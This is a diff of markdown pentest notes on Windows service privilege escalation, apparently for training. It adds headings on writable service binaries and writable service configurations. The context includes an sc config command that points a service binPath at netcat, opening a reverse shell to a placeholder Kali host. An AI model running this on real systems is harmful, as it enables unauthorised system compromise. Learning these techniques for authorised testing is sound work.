@@ -206,6 +206,7 @@ If writable → privilege escalation.
 
 Check service permissions:
 
+### Writable Service Binary
 ```powershell
 sc qc <service_name>
 ```
@@ -216,14 +217,17 @@ Check writable service binary:
 icacls "C:\path\to\service.exe"
 ```
 
-Check if we have privileges over that process. You can change the binary path name.
+If writable → replace executable.
+
+### Writable Service Configuration
+
+Check if we have privileges over that process. If so, you can change the binary path name.
+
 ```
 Use accesschk64 (https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
 .\accesschk64.exe /accepteula -uwcqv <service_name>
 sc config <service_name> binPath="nc.exe <KALI_IP> <PORT> -e C:\Windows\system32\cmd.exe"
 ```
-
-If writable → replace executable.
 
 ---
 
